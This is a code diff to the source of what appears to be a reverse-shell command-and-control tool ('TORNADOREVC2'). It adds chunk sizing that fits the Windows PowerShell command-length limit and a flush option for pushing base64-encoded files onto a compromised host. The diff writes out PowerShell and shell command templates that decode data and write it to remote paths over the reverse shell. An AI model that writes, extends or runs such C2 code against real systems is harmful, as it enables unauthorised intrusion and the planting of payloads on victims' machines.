@@ -29,6 +29,7 @@ except ImportError:
         readline = None
 
 from .constants import (
+    CHUNK_SIZE,
     CLIENT_COMMANDS,
     ID_COMMANDS,
     IDENT_MARK_END,
@@ -411,6 +412,28 @@ class TORNADOREVC2:
 
     _WIN_PS_CMD_LIMIT = 8190
 
+    def _max_win_inline_chunk(self, remote_path, truncate=False):
+        """Largest raw payload that fits in one inline PowerShell write command."""
+        path = self._escape_path(remote_path, 'windows')
+        mode = 'Create' if truncate else 'Append'
+        template = (
+            f"$d=[Convert]::FromBase64String('');"
+            f"$fs=[IO.File]::Open('{path}', [IO.FileMode]::{mode});"
+            f"$fs.Write($d,0,$d.Length);$fs.Close();"
+            f"'{XFER_MARK_START}OK{XFER_MARK_END}'"
+        )
+        overhead = len(f'powershell -NoProfile -Command "{template}"')
+        available = self._WIN_PS_CMD_LIMIT - overhead
+        if available <= 0:
+            return CHUNK_SIZE['windows']
+        return max(1024, int(available * 3 / 4))
+
+    def _write_chunk_size(self, remote_path, shell_type, truncate=False):
+        base = CHUNK_SIZE.get(shell_type, CHUNK_SIZE['unknown'])
+        if shell_type == 'windows':
+            return min(base, self._max_win_inline_chunk(remote_path, truncate=truncate))
+        return base
+
     def _win_ps_cmd(self, script):
         encoded = base64.b64encode(script.encode('utf-16-le')).decode('ascii')
         cmd = f"powershell -NoProfile -EncodedCommand {encoded}"
@@ -584,7 +607,7 @@ class TORNADOREVC2:
         self.recv_output(client_sock, timeout=3.0)
         return True
 
-    def _remote_write_chunk(self, client_sock, remote_path, chunk_bytes, shell_type, truncate=False):
+    def _remote_write_chunk(self, client_sock, remote_path, chunk_bytes, shell_type, truncate=False, skip_flush=False):
         path = self._escape_path(remote_path, shell_type)
         b64 = base64.b64encode(chunk_bytes).decode()
         if shell_type == 'windows':
@@ -607,7 +630,8 @@ class TORNADOREVC2:
                 f"(printf '%s' '{b64}' | base64 -d >> '{path}' && printf 'OK')); "
                 f"printf '%s' '{XFER_MARK_END}'"
             )
-        self._flush_shell(client_sock, timeout=0.2)
+        if not skip_flush:
+            self._flush_shell(client_sock, timeout=0.2)
         if not self.send_to_revshell(client_sock, cmd):
             return False
         output = self.recv_output(client_sock, timeout=60.0, until_marker=XFER_MARK_END)
